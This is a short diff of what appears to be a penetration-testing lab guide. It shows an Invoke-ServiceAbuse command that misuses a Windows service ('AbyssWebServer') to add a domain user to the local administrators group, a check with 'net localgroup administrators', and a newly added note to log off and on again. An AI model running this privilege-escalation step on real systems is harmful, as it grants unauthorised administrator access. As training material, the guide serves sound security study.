@@ -70,7 +70,8 @@ help Invoke-ServiceAbuse -Examples
 # Practical use
 Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
 # Verify if the above command worked or not with
-net localgroup administrators  
+net localgroup administrators
+# Logoff and login again to affect changes
 ```
 {% endtab %}
 
